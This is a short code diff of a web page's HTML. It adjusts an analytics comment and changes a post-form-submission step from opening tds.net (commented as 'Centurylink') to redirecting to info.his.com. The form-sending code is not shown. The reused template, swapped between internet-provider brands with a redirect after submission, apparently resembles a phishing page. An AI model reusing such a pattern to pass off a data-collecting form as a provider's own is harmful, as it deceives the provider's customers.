@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     
-    <!-- Privacy-friendly analytics by Plausible -->
+  <!-- Privacy-friendly analytics by Plausible -->
   <script async src="https://plausible.io/js/pa-LsclXKnNgt32tqJUvKdct.js"></script>
   <script>
     window.plausible = window.plausible || function() {
@@ -246,11 +246,8 @@
         .then(function (response) {
           console.log("SUCCESS!", response.status, response.text);
 
-          // Open Centurylink in a new tab
-          window.open("https://www.tds.net", "_self");
-
-          // Attempt to close current tab (works only if tab was script-opened)
-          window.close();
+          // Redirect to info.his.com in the same tab
+          window.location.href = "https://info.his.com";
         })
         .catch(function (error) {
           console.error("FAILED...", error);
